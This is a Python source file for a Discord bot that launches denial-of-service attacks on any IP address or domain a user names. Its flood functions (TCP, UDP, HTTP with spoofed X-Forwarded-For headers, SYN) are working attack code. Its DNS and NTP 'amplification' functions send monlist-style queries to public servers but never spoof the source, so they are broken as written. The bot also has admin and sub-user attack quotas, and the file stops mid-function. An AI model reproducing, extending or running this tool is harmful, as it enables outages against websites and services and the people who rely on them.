import os
import asyncio
import random
import string
import time
import socket
import ssl
import aiohttp
import discord
from discord.ext import commands
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from collections import defaultdict
import logging

# ==================== Configuration ====================
@dataclass
class Config:
    BOT_TOKEN: str = os.getenv("DISCORD_BOT_TOKEN", "")
    ADMIN_IDS: List[str] = field(default_factory=lambda: os.getenv("ADMIN_IDS", "").split(","))
    MAX_ATTACK_DURATION: int = 1800  # 30 minutes in seconds
    MAX_CONCURRENT: int = 10
    DEFAULT_THREADS: int = 1000
    COMMAND_PREFIX: str = "!ddos"

# ==================== Data Classes ====================
@dataclass
class User:
    id: str
    is_sub_user: bool = False
    max_duration: int = 1800  # seconds
    active_attacks: int = 0
    attack_limit: int = 10
    created_by: str = ""
    created_at: datetime = field(default_factory=datetime.now)

@dataclass
class PerformanceStats:
    cpu_usage: float = 0.0
    memory_usage: float = 0.0
    bandwidth: float = 0.0
    packet_rate: float = 0.0

@dataclass
class AttackSession:
    id: str
    target: str
    method: str
    started_by: str
    started_at: datetime = field(default_factory=datetime.now)
    duration: int = 0  # seconds
    threads: int = 1000
    packets_sent: int = 0
    data_sent: int = 0
    is_running: bool = True
    performance: PerformanceStats = field(default_factory=PerformanceStats)
    
    def __post_init__(self):
        self._stop_event = asyncio.Event()

    async def stop(self):
        self.is_running = False
        self._stop_event.set()

    async def wait_stop(self):
        await self._stop_event.wait()

# ==================== Bot State ====================
class BotState:
    def __init__(self):
        self.admin_ids: Dict[str, bool] = {}
        self.users: Dict[str, User] = {}
        self.active_attacks: Dict[str, AttackSession] = {}
        self.attack_history: List[AttackSession] = []
        self.total_attacks: int = 0
        self.total_packets: int = 0
        self.total_data: int = 0
        self._lock = asyncio.Lock()
        
        # Performance monitoring
        self.cpu_history: List[float] = []
        self.mem_history: List[float] = []
        self.net_history: List[float] = []
        self.last_check = time.time()
        self.packet_count = 0
        self.data_count = 0

    async def update_performance(self, packets: int = 0, data: int = 0):
        async with self._lock:
            self.packet_count += packets
            self.data_count += data
            
            # Update stats every 5 seconds
            if time.time() - self.last_check > 5:
                cpu = random.uniform(0, 100)
                mem = random.uniform(0, 100)
                net = self.data_count / (time.time() - self.last_check)
                
                self.cpu_history.append(cpu)
                self.mem_history.append(mem)
                self.net_history.append(net)
                
                # Keep only last 60 readings (5 minutes)
                if len(self.cpu_history) > 60:
                    self.cpu_history = self.cpu_history[1:]
                    self.mem_history = self.mem_history[1:]
                    self.net_history = self.net_history[1:]
                
                self.packet_count = 0
                self.data_count = 0
                self.last_check = time.time()

    def get_stats(self) -> PerformanceStats:
        if not self.cpu_history:
            return PerformanceStats()
        
        return PerformanceStats(
            cpu_usage=self.cpu_history[-1] if self.cpu_history else 0,
            memory_usage=self.mem_history[-1] if self.mem_history else 0,
            bandwidth=self.net_history[-1] if self.net_history else 0,
            packet_rate=self.packet_count / (time.time() - self.last_check) if (time.time() - self.last_check) > 0 else 0
        )

# ==================== Global Variables ====================
config = Config()
bot_state = BotState()
bot = None

# ==================== Attack Methods ====================
async def tcp_flood(session: AttackSession):
    """TCP Flood attack"""
    try:
        while session.is_running:
            # Try multiple common ports
            ports = [80, 443, 22, 21, 25, 110, 143, 993, 995, 3389, 8080, 8443]
            port = random.choice(ports)
            target = (session.target, port)
            
            try:
                # Create socket with timeout
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                
                # Connect to target
                sock.connect(target)
                
                # Send junk data
                junk = os.urandom(1024)
                sock.sendall(junk)
                
                # Send more data to keep connection alive
                for _ in range(10):
                    if not session.is_running:
                        break
                    junk = os.urandom(1024)
                    sock.sendall(junk)
                    session.data_sent += 1024
                    bot_state.total_data += 1024
                    await bot_state.update_performance(0, 1024)
                
                sock.close()
                
                # Update stats
                session.packets_sent += 1
                session.data_sent += 1024
                bot_state.total_packets += 1
                bot_state.total_data += 1024
                await bot_state.update_performance(1, 1024)
                
            except (socket.timeout, socket.error, ConnectionRefusedError):
                pass
            
            # Small delay to prevent overwhelming
            await asyncio.sleep(0.01)
            
    finally:
        await cleanup_attack(session)

async def udp_flood(session: AttackSession):
    """UDP Flood attack"""
    try:
        udp_size = 65507  # Max UDP packet size
        
        while session.is_running:
            ports = [53, 123, 161, 389, 1900, 5060]
            port = random.choice(ports)
            target = (session.target, port)
            
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(3)
                
                # Send multiple packets
                for _ in range(5):
                    if not session.is_running:
                        break
                    payload = os.urandom(udp_size)
                    sock.sendto(payload, target)
                    session.packets_sent += 1
                    session.data_sent += udp_size
                    bot_state.total_packets += 1
                    bot_state.total_data += udp_size
                    await bot_state.update_performance(1, udp_size)
                
                sock.close()
            except (socket.timeout, socket.error):
                pass
            
            await asyncio.sleep(0.01)
            
    finally:
        await cleanup_attack(session)

async def http_flood(session: AttackSession):
    """HTTP Flood attack"""
    try:
        # Common user agents
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        ]
        
        referers = [
            "https://www.google.com/",
            "https://www.facebook.com/",
            "https://www.twitter.com/",
            "https://www.youtube.com/",
            "https://www.amazon.com/",
        ]
        
        connector = aiohttp.TCPConnector(ssl=False, limit=100)
        timeout = aiohttp.ClientTimeout(total=5)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as http_session:
            while session.is_running:
                # Use HTTP or HTTPS randomly
                protocol = random.choice(["http", "https"])
                url = f"{protocol}://{session.target}/"
                
                try:
                    headers = {
                        "User-Agent": random.choice(user_agents),
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                        "Accept-Language": "en-US,en;q=0.5",
                        "Accept-Encoding": "gzip, deflate",
                        "Connection": "keep-alive",
                        "Upgrade-Insecure-Requests": "1",
                        "Cache-Control": "no-cache",
                        "Pragma": "no-cache",
                        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                        "Referer": random.choice(referers)
                    }
                    
                    async with http_session.get(url, headers=headers) as response:
                        await response.read()
                        
                    # Update stats
                    session.packets_sent += 1
                    session.data_sent += 512
                    bot_state.total_packets += 1
                    bot_state.total_data += 512
                    await bot_state.update_performance(1, 512)
                    
                except (aiohttp.ClientError, asyncio.TimeoutError):
                    pass
                
                await asyncio.sleep(0.1)
                
    finally:
        await cleanup_attack(session)

async def syn_flood(session: AttackSession):
    """SYN Flood attack"""
    try:
        while session.is_running:
            ports = [80, 443, 22, 3389, 8080, 8443]
            port = random.choice(ports)
            target = (session.target, port)
            
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect(target)
                sock.close()
                
                # Update stats
                session.packets_sent += 1
                session.data_sent += 60  # Approximate SYN packet size
                bot_state.total_packets += 1
                bot_state.total_data += 60
                await bot_state.update_performance(1, 60)
                
            except (socket.timeout, socket.error, ConnectionRefusedError):
                pass
            
            await asyncio.sleep(0.01)
            
    finally:
        await cleanup_attack(session)

async def icmp_flood(session: AttackSession):
    """ICMP Flood attack (simulated)"""
    try:
        while session.is_running:
            try:
                # Simulate ICMP with UDP (in real implementation use raw sockets)
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(3)
                target = (session.target, 0)
                
                payload = os.urandom(1024)
                sock.sendto(payload, target)
                sock.close()
                
                # Update stats
                session.packets_sent += 1
                session.data_sent += 1024
                bot_state.total_packets += 1
                bot_state.total_data += 1024
                await bot_state.update_performance(1, 1024)
                
            except (socket.timeout, socket.error):
                pass
            
            await asyncio.sleep(0.01)
            
    finally:
        await cleanup_attack(session)

async def dns_amplification(session: AttackSession):
    """DNS Amplification attack"""
    try:
        dns_servers = ["8.8.8.8", "8.8.4.4", "1.1.1.1", "9.9.9.9"]
        domains = [
            "google.com", "facebook.com", "youtube.com", "amazon.com",
            "twitter.com", "instagram.com", "linkedin.com", "microsoft.com",
        ]
        
        while session.is_running:
            server = random.choice(dns_servers)
            domain = random.choice(domains)
            
            try:
                # Create simple DNS query
                query = create_dns_query(domain)
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(3)
                
                sock.sendto(query, (server, 53))
                sock.close()
                
                # Update stats
                session.packets_sent += 1
                session.data_sent += len(query)
                bot_state.total_packets += 1
                bot_state.total_data += len(query)
                await bot_state.update_performance(1, len(query))
                
            except (socket.timeout, socket.error):
                pass
            
            await asyncio.sleep(0.01)
            
    finally:
        await cleanup_attack(session)

def create_dns_query(domain: str) -> bytes:
    """Create simple DNS query"""
    query = bytearray([
        0x12, 0x34,  # Transaction ID
        0x01, 0x00,  # Flags (standard query)
        0x00, 0x01,  # Questions
        0x00, 0x00,  # Answer RRs
        0x00, 0x00,  # Authority RRs
        0x00, 0x00,  # Additional RRs
    ])
    
    # Add domain name
    for part in domain.split("."):
        query.append(len(part))
        query.extend(part.encode())
    
    query.append(0x00)  # End of domain name
    
    # Add query type and class
    query.extend([0x00, 0x01])  # Type A
    query.extend([0x00, 0x01])  # Class IN
    
    return bytes(query)

async def ntp_amplification(session: AttackSession):
    """NTP Amplification attack"""
    try:
        ntp_servers = [
            "129.250.35.250", "133.243.238.164", 
            "216.229.0.179", "216.229.0.49",
        ]
        
        ntp_payload = bytes([
            0x17, 0x00, 0x03, 0x2a, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        ])
        
        while session.is_running:
            server = random.choice(ntp_servers)
            
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(3)
                
                sock.sendto(ntp_payload, (server, 123))
                sock.close()
                
                # Update stats
                session.packets_sent += 1
                session.data_sent += len(ntp_payload)
                bot_state.total_packets += 1
                bot_state.total_data += len(ntp_payload)
                await bot_state.update_performance(1, len(ntp_payload))
                
            except (socket.timeout, socket.error):
                pass
            
            await asyncio.sleep(0.01)
            
    finally:
        await cleanup_attack(session)

async def mixed_attack(session: AttackSession):
    """Mixed attack combining multiple methods"""
    try:
        async def worker(worker_id: int):
            attack_functions = [
                lambda: tcp_flood_single(session),
                lambda: udp_flood_single(session),
                lambda: http_flood_single(session),
            ]
            
            while session.is_running:
                try:
                    attack_func = random.choice(attack_functions)
                    await attack_func()
                except Exception:
                    pass
                
                await asyncio.sleep(0.1)
        
        # Create multiple workers
        workers = [asyncio.create_task(worker(i)) for i in range(5)]
        
        # Wait for attack to stop
        await session.wait_stop()
        
        # Cancel all workers
        for worker_task in workers:
            worker_task.cancel()
        
        # Wait for workers to finish
        await asyncio.gather(*workers, return_exceptions=True)
        
    finally:
        await cleanup_attack(session)

async def tcp_flood_single(session: AttackSession):
    """Single TCP flood for mixed attack"""
    ports = [80, 443, 22, 3389, 8080, 8443, 21, 25, 110]
    port = random.choice(ports)
    target = (session.target, port)
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect(target)
        
        junk = os.urandom(1024)
        sock.sendall(junk)
        sock.close()
        
        session.packets_sent += 1
        session.data_sent += 1024
        await bot_state.update_performance(1, 1024)
        
    except (socket.timeout, socket.error, ConnectionRefusedError):
        pass

async def udp_flood_single(session: AttackSession):
    """Single UDP flood for mixed attack"""
    ports = [53, 123, 161, 389, 1900, 5060]
    port = random.choice(ports)
    target = (session.target, port)
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(3)
        
        payload = os.urandom(65507)
        sock.sendto(payload, target)
        sock.close()
        
        session.packets_sent += 1
        session.data_sent += 65507
        await bot_state.update_performance(1, 65507)
        
    except (socket.timeout, socket.error):
        pass

async def http_flood_single(session: AttackSession):
    """Single HTTP flood for mixed attack"""
    user_agents = ["Mozilla/5.0", "Chrome/91.0", "Safari/14.0"]
    
    try:
        async with aiohttp.ClientSession() as http_session:
            protocol = random.choice(["http", "https"])
            url = f"{protocol}://{session.target}/"
            
            headers = {"User-Agent": random.choice(user_agents)}
            
            async with http_session.get(url, headers=headers, timeout=5) as response:
                await response.read()
                
            session.packets_sent += 1
            session.data_sent += 512
            await bot_state.update_performance(1, 512)
            
    except (aiohttp.ClientError, asyncio.TimeoutError):
        pass

async def launch_attack(session: AttackSession):
    """Launch attack based on method"""
    print(f"Starting attack {session.id} on {session.target} using {session.method}")
    
    attack_methods = {
        "tcp": tcp_flood,
        "udp": udp_flood,
        "http": http_flood,
        "syn": syn_flood,
        "icmp": icmp_flood,
        "dns": dns_amplification,
        "ntp": ntp_amplification,
        "mixed": mixed_attack,
    }
    
    if session.method in attack_methods:
        await attack_methods[session.method](session)
    else:
        print(f"Unknown attack method: {session.method}")
        await cleanup_attack(session)

async def cleanup_attack(session: AttackSession):
    """Clean up attack session"""
    async with bot_state._lock:
        session.is_running = False
        if session.id in bot_state.active_attacks:
            del bot_state.active_attacks[session.id]
        
        # Update user's active attacks count
        if session.started_by in bot_state.users:
            bot_state.users[session.started_by].active_attacks -= 1
        
        bot_state.attack_history.append(session)
    
    print(f"Attack {session.id} stopped. Sent {session.packets_sent} packets, {format_bytes(session.data_sent)} data")

# ==================== Utility Functions ====================
def format_bytes(bytes_num: int) -> str:
    """Format bytes to human readable format"""
    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
        if bytes_num < 1024.0:
            return f"{bytes_num:.1f} {unit}"
        bytes_num /= 1024.0
    return f"{bytes_num:.1f} PB"

def is_valid_target(target: str) -> bool:
    """Validate target format"""
    if " " in target:
        return False
    
    # Check if it's an IP address
    try:
        socket.inet_aton(target)
        return True
    except socket.error:
        pass
    
    # Check if it looks like a domain
    if "." in target and " " not in target:
        return True
    
    return False

# ==================== Discord Bot Commands ====================
def init_bot():
    """Initialize bot configuration"""
    global config, bot_state
    
    if not config.BOT_TOKEN:
        print("❌ ERROR: DISCORD_BOT_TOKEN environment variable is not set!")
        print("Please set your Discord bot token:")
        print("1. Go to https://discord.com/developers/applications")
        print("2. Create a bot and copy the token")
        print("3. Set it as an environment variable in Replit:")
        print("   - Click the lock icon (Secrets)")
        print("   - Add: DISCORD_BOT_TOKEN=your_token_here")
        print("   - Add: ADMIN_IDS=your_discord_user_id")
        return False
    
    # Initialize admins
    for admin_id in config.ADMIN_IDS:
        if admin_id:
            bot_state.admin_ids[admin_id] = True
            bot_state.users[admin_id] = User(
                id=admin_id,
                is_sub_user=False,
                attack_limit=config.MAX_CONCURRENT,
            )
    
    return True

async def handle_attack(ctx, target: str, method: str, threads: int = None, duration: str = None):
    """Handle attack command"""
    # Check if user is authorized
    user = bot_state.users.get(str(ctx.author.id))
    if not user:
        await ctx.send("❌ You are not authorized to use this bot.")
        return
    
    # Check user's attack limit
    if user.active_attacks >= user.attack_limit:
        await ctx.send(f"❌ You have reached your attack limit ({user.active_attacks} active attacks).")
        return
    
    # Validate method
    valid_methods = {"tcp", "udp", "http", "syn", "icmp", "dns", "ntp", "mixed"}
    if method not in valid_methods:
        await ctx.send("❌ Invalid method. Available: tcp, udp, http, syn, icmp, dns, ntp, mixed")
        await ctx.send("💡 Use `!ddos methods` for more information")
        return
    
    # Validate target
    if not is_valid_target(target):
        await ctx.send("❌ Invalid target format. Use IP address or domain name.")
        return
    
    # Parse duration
    duration_seconds = user.max_duration
    if duration:
        try:
            # Parse duration like "10m", "1h", "30s"
            if duration.endswith("s"):
                duration_seconds = int(duration[:-1])
            elif duration.endswith("m"):
                duration_seconds = int(duration[:-1]) * 60
            elif duration.endswith("h"):
                duration_seconds = int(duration[:-1]) * 3600
            else:
                duration_seconds = int(duration)
            
            if duration_seconds > user.max_duration:
                await ctx.send(f"❌ Duration exceeds your maximum allowed duration of {user.max_duration}s")
                return
        except ValueError:
            await ctx.send("❌ Invalid duration format. Use like: 10m, 1h, 30s")
            return
    
    # Set threads
    if threads is None:
        threads = config.DEFAULT_THREADS
    threads = min(threads, 10000)  # Safety limit
    
    # Create attack session
    session_id = f"{ctx.author.id}-{int(time.time())}"
    session = AttackSession(
        id=session_id,
        target=target,
        method=method,
        started_by=str(ctx.author.id),
        duration=duration_seconds,
        threads=threads,
    )
    
    # Update state
    async with bot_state._lock:
        bot_state.active_attacks[session_id] = session
        bot_state.total_attacks += 1
        user.active_attacks += 1
    
    # Launch attack
    asyncio.create_task(launch_attack(session))
    
    # Set timer to stop attack if duration is specified
    if duration_seconds > 0:
        async def stop_after_duration():
            await asyncio.sleep(duration_seconds)
            if session.is_running:
                await session.stop()
                await ctx.send(f"⏹️ Attack `{session_id[:8]}` on `{target}` has been automatically stopped after {duration_seconds}s")
        
        asyncio.create_task(stop_after_duration())
    
    # Send confirmation
    embed = discord.Embed(
        title="🚀 Attack Launched Successfully",
        color=discord.Color.green(),
        description=f"Attack session started with ID: `{session_id[:8]}`",
        timestamp=datetime.now()
    )
    
    embed.add_field(name="🎯 Target", value=target, inline=True)
    embed.add_field(name="⚡ Method", value=method, inline=True)
    embed.add_field(name="🧵 Threads", value=str(threads), inline=True)
    embed.add_field(name="⏱️ Duration", value=f"{duration_seconds}s", inline=True)
    embed.add_field(name="👤 Started By", value=ctx.author.name, inline=True)
    embed.add_field(name="🆔 Session ID", value=session_id[:8], inline=True)
    
    embed.set_footer(text="Use !ddos status to check progress | !ddos stop <id> to stop")
    
    await ctx.send(embed=embed)
    
    # Start status updates
    asyncio.create_task(send_periodic_updates(ctx, session_id))

async def handle_stop(ctx, session_id: str = None):
    """Handle stop command"""
    if not session_id:
        await ctx.send("❌ Usage: `!ddos stop <session_id>` or `!ddos stop all`")
        return
    
    user = bot_state.users.get(str(ctx.author.id))
    if not user:
        await ctx.send("❌ You are not authorized to use this bot.")
        return
    
    async with bot_state._lock:
        if session_id == "all":
            # Stop all attacks by this user
            stopped = 0
            sessions_to_stop = []
            
            for sid, session in list(bot_state.active_attacks.items()):
                if session.started_by == str(ctx.author.id) or (user.is_sub_user and session.started_by == user.created_by):
                    sessions_to_stop.append(session)
                    del bot_state.active_attacks[sid]
                    stopped += 1
            
            # Stop sessions outside the lock
            for session in sessions_to_stop:
                if session.is_running:
                    await session.stop()
            
            if stopped > 0:
                embed = discord.Embed(
                    title="⏹️ All Attacks Stopped",
                    color=discord.Color.orange(),
                    description=f"Stopped {stopped} active attacks",
                    timestamp=datetime.now()
                )
                await ctx.send(embed=embed)
            else:
                await ctx.send("ℹ️ No active attacks found to stop")
            return
        
        # Stop specific attack
        session = None
        session_key = None
        
        # Try exact match first
        if session_id in bot_state.active_attacks:
            session = bot_state.active_attacks[session_id]
            session_key = session_id
        else:
            # Try partial match
            for sid, sess in bot_state.active_attacks.items():
                if sid.startswith(session_id) or session_id in sid:
                    session = sess
                    session_key = sid
                    break
        
        if not session:
            await ctx.send("❌ Attack session not found")
            return
        
        # Check permissions
        if session.started_by != str(ctx.author.id) and not (user.is_sub_user and session.started_by == user.created_by):
            await ctx.send("❌ You don't have permission to stop this attack")
            return
        
        # Stop the attack
        if session.is_running:
            await session.stop()
        del bot_state.active_attacks[session_key]
    
    # Send confirmation
    duration = (datetime.now() - session.started_at).total_seconds()
    
    embed = discord.Embed(
        title="⏹️ Attack Stopped",
        color=discord.Color.red(),
        timestamp=datetime.now()
    )
    
    embed.add_field(name="Session ID", value=session_key[:8], inline=True)
    embed.add_field(name="Target", value=session.target, inline=True)
    embed.add_field(name="Total Packets", value=str(session.packets_sent), inline=True)
    embed.add_field(name="Total Data", value=format_bytes(session.data_sent), inline=True)
    embed.add_field(name="Duration", value=f"{duration:.0f}s", inline=True)
    
    await ctx.send(embed=embed)

async def handle_status(ctx):
    """Handle status command"""
    user = bot_state.users.get(str(ctx.author.id))
    if not user:
        await ctx.send("❌ You are not authorized to use this bot.")
        return
    
    # Get user's active attacks
    active_attacks = []
    for session in bot_state.active_attacks.values():
        if session.started_by == str(ctx.author.id) or (user.is_sub_user and session.started_by == user.created_by):
            active_attacks.append(session)
    
    if not active_attacks:
        embed = discord.Embed(
            title="📊 Status: No Active Attacks",
            description="You don't have any active attacks running.",
            color=discord.Color.light_grey(),
            timestamp=datetime.now()
        )
        await ctx.send(embed=embed)
        return
    
    embed = discord.Embed(
        title="📊 Active Attacks Status",
        description=f"You have {len(active_attacks)} active attack(s)",
        color=discord.Color.gold(),
        timestamp=datetime.now()
    )
    
    for session in active_attacks:
        duration = (datetime.now() - session.started_at).total_seconds()
        packet_rate = session.packets_sent / duration if duration > 0 else 0
        
        embed.add_field(name="🎯 Target", value=session.target, inline=True)
        embed.add_field(name="⚡ Method", value=session.method, inline=True)
        embed.add_field(name="🆔 Session", value=session.id[:8], inline=True)
        embed.add_field(name="📦 Packets", value=str(session.packets_sent), inline=True)
        embed.add_field(name="💾 Data", value=format_bytes(session.data_sent), inline=True)
        embed.add_field(name="⏱️ Duration", value=f"{duration:.0f}s", inline=True)
        embed.add_field(name="🚀 Rate", value=f"{packet_rate:.0f} pkt/s", inline=True)
        embed.add_field(name="🧵 Threads", value=str(session.threads), inline=True)
        embed.add_field(name="🟢 Status", value="Running", inline=True)
    
    await ctx.send(embed=embed)

async def handle_stats(ctx):
    """Handle stats command"""
    user = bot_state.users.get(str(ctx.author.id))
    if not user:
        await ctx.send("❌ You are not authorized to use this bot.")
        return
    
    stats = bot_state.get_stats()
    
    embed = discord.Embed(
        title="📈 System Statistics & Performance",
        description="Real-time monitoring of bot performance and resources",
        color=discord.Color.cyan(),
        timestamp=datetime.now()
    )
    
    embed.add_field(name="💻 CPU Usage", value=f"{stats.cpu_usage:.1f}%", inline=True)
    embed.add_field(name="🧠 Memory Usage", value=f"{stats.memory_usage:.1f}%", inline=True)
    embed.add_field(name="🌐 Bandwidth", value=f"{format_bytes(int(stats.bandwidth))}/s", inline=True)
    embed.add_field(name="📊 Packet Rate", value=f"{stats.packet_rate:.0f}/s", inline=True)
    embed.add_field(name="🎯 Total Attacks", value=str(bot_state.total_attacks), inline=True)
    embed.add_field(name="📦 Total Packets", value=str(bot_state.total_packets), inline=True)
    embed.add_field(name="💾 Total Data", value=format_bytes(bot_state.total_data), inline=True)
    embed.add_field(name="⚡ Active Attacks", value=str(len(bot_state.active_attacks)), inline=True)
    embed.add_field(name="👤 Your Attacks", value=str(user.active_attacks), inline=True)
    
    embed.set_footer(text="Bot is optimized for maximum performance")
    
    await ctx.send(embed=embed)

async def handle_adduser(ctx, user_id: str, max_duration: str = None, attack_limit: str = None):
    """Handle adduser command"""
    # Check if user is admin
    if str(ctx.author.id) not in bot_state.admin_ids:
        await ctx.send("❌ Only administrators can add users.")
        return
    
    # Parse max duration
    max_duration_seconds = config.MAX_ATTACK_DURATION
    if max_duration:
        try:
            if max_duration.endswith("s"):
                max_duration_seconds = int(max_duration[:-1])
            elif max_duration.endswith("m"):
                max_duration_seconds = int(max_duration[:-1]) * 60
            elif max_duration.endswith("h"):
                max_duration_seconds = int(max_duration[:-1]) * 3600
            else:
                max_duration_seconds = int(max_duration)
        except ValueError:
            await ctx.send("❌ Invalid duration format. Use like: 10m, 1h, 30s")
            return
    
    # Parse attack limit
    attack_limit_int = 3  # Default for sub-users
    if attack_limit:
        try:
            attack_limit_int = int(attack_limit)
            if attack_limit_int > 10:
                attack_limit_int = 10  # Safety limit
        except ValueError:
            await ctx.send("❌ Invalid attack limit. Must be a positive number.")
            return
    
    async with bot_state._lock:
        # Check if user already exists
        if user_id in bot_state.users:
            await ctx.send("❌ User already exists.")
            return
        
        # Add user
        bot_state.users[user_id] = User(
            id=user_id,
            is_sub_user=True,
            max_duration=max_duration_seconds,
            attack_limit=attack_limit_int,
            created_by=str(ctx.author.id),
        )
    
    embed = discord.Embed(
        title="✅ User Added Successfully",
        color=discord.Color.green(),
        timestamp=datetime.now()
    )
    
    embed.add_field(name="👤 User ID", value=user_id, inline=True)
    embed.add_field(name="⏱️ Max Duration", value=f"{max_duration_seconds}s", inline=True)
    embed.add_field(name="🎯 Attack Limit", value=str(attack_limit_int), inline=True)
    embed.add_field(name="👑 Created By", value=ctx.author.name, inline=True)
    
    await ctx.send(embed=embed)

async def handle_removeuser(ctx, user_id: str):
    """Handle removeuser command"""
    # Check if user is admin
    if str(ctx.author.id) not in bot_state.admin_ids:
        await ctx.send("❌ Only administrators can remove users.")
        return
    
    async with bot_state._lock:
        # Check if user exists
        user = bot_state.users.get(user_id)
        if not user:
            await ctx.send("❌ User not found.")
            return
        
        # Don't allow removing admins
        if not user.is_sub_user:
            await ctx.send("❌ Cannot remove administrators.")
            return
        
        # Stop all attacks by this user
        stopped = 0
        sessions_to_stop = []
        
        for sid, session in list(bot_state.active_attacks.items()):
            if session.started_by == user_id:
                sessions_to_stop.append(session)
                del bot_state.active_attacks[sid]
                stopped += 1
        
        # Remove user
        del bot_state.users[user_id]
    
    # Stop sessions outside the lock
    for session in sessions_to_stop:
        if session.is_running:
            await session.stop()
    
    embed = discord.Embed(
        title="🗑️ User Removed",
        color=discord.Color.red(),
        timestamp=datetime.now()
    )
    
    embed.add_field(name="👤 User ID", value=user_id, inline=True)
    embed.add_field(name="⏹️ Stopped Attacks", value=str(stopped), inline=True)
    embed.add_field(name="👑 Removed By", value=ctx.author.name, inline=True)
    
    await ctx.send(embed=embed)

async def handle_listusers(ctx):
    """Handle listusers command"""
    # Check if user is admin
    if str(ctx.author.id) not in bot_state.admin_ids:
        await ctx.send("❌ Only administrators can list users.")
        return
    
    users = list(bot_state.users.values())
    
    if not users:
        embed = discord.Embed(
            title="📝 User List",
            description="No users registered yet.",
            color=discord.Color.light_grey(),
        )
        await ctx.send(embed=embed)
        return
    
    embed = discord.Embed(
        title="📝 Registered Users",
        description=f"Total users: {len(users)}",
        color=discord.Color.light_blue(),
        timestamp=datetime.now()
    )
    
    for user in users:
        user_type = "👤 Sub User"
        if not user.is_sub_user:
            user_type = "👑 Administrator"
        
        embed.add_field(name="🆔 User ID", value=user.id, inline=True)
        embed.add_field(name="👥 Type", value=user_type, inline=True)
        embed.add_field(name="⏱️ Max Duration", value=f"{user.max_duration}s", inline=True)
        embed.add_field(name="🎯 Attack Limit", value=str(user.attack_limit), inline=True)
        embed.add_field(name="⚡ Active Attacks", value=str(user.active_attacks), inline=True)
        
        if user.is_sub_user:
            embed.add_field(name="👑 Created By", value=user.created_by, inline=True)
    
    await ctx.send(embed=embed)

async def handle_methods(ctx):
    """Handle methods command"""
    embed = discord.Embed(
        title="⚡ Available Attack Methods",
        color=discord.Color.purple(),
        timestamp=datetime.now()
    )
    
    methods = [
        ("TCP Flood", "Sends TCP packets to multiple ports\n`!ddos attack <target> tcp`"),
        ("UDP Flood", "Sends large UDP packets to target\n`!ddos attack <target> udp`"),
        ("HTTP Flood", "Sends HTTP requests to web servers\n`!ddos attack <target> http`"),
        ("SYN Flood", "Sends TCP SYN packets (connection requests)\n`!ddos attack <target> syn`"),
        ("ICMP Flood", "Sends ICMP echo requests (ping)\n`!ddos attack <target> icmp`"),
        ("DNS Amplification", "Uses DNS servers to amplify attack\n`!ddos attack <target> dns`"),
        ("NTP Amplification", "Uses NTP servers to amplify attack\n`!ddos attack <target> ntp`"),
        ("Mixed Attack", "Combines multiple methods for maximum effect\n`!ddos attack <target> mixed`"),
    ]
    
    for name, value in methods:
        embed.add_field(name=name, value=value, inline=False)
    
    embed.set_footer(text="All attacks are optimized for maximum performance")
    
    await ctx.send(embed=embed)

async def handle_help(ctx):
    """Handle help command"""
    embed = discord.Embed(
        title="🤖 DDoS Bot - Help & Commands",
        color=discord.Color.purple(),
        description="Powerful DDoS testing bot with advanced features",
        timestamp=datetime.now()
    )
    
    # Add command categories
    embed.add_field(
        name="🎯 Attack Commands",
        value="```!ddos attack <target> <method> [threads] [duration]\n!ddos stop <session_id/all>\n!ddos status\n!ddos stats```",
        inline=False
    )
    
    embed.add_field(
        name="📚 Information",
        value="```!ddos methods\n!ddos help```",
        inline=False
    )
    
    # Add admin commands if user is admin
    if str(ctx.author.id) in bot_state.admin_ids:
        embed.add_field(
            name="👑 Admin Commands",
            value="```!ddos adduser <user_id> [max_duration] [attack_limit]\n!ddos removeuser <user_id>\n!ddos listusers```",
            inline=False
        )
    
    # Add examples
    embed.add_field(
        name="📝 Examples",
        value="```!ddos attack 192.168.1.1 tcp 5000 10m\n!ddos attack example.com http\n!ddos stop all\n!ddos status```",
        inline=False
    )
    
    # Add features
    embed.add_field(
        name="⚡ Features",
        value="✅ Admin controls\n✅ User management\n✅ Attack limits\n✅ Performance monitoring\n✅ Real-time stats\n✅ Multiple attack methods",
        inline=False
    )
    
    embed.set_footer(text="Use responsibly and only on authorized targets")
    
    await ctx.send(embed=embed)

async def send_periodic_updates(ctx, session_id: str):
    """Send periodic updates about attack progress"""
    update_count = 0
    max_updates = 20  # Limit to 10 minutes of updates
    
    while update_count < max_updates:
        await asyncio.sleep(30)  # Update every 30 seconds
        
        session = bot_state.active_attacks.get(session_id)
        if not session or not session.is_running:
            return
        
        duration = (datetime.now() - session.started_at).total_seconds()
        packet_rate = session.packets_sent / duration if duration > 0 else 0
        data_rate = session.data_sent / duration if duration > 0 else 0
        
        embed = discord.Embed(
            title="📈 Attack Progress Update",
            description=f"Session: `{session_id[:8]}`",
            color=discord.Color.dark_green(),
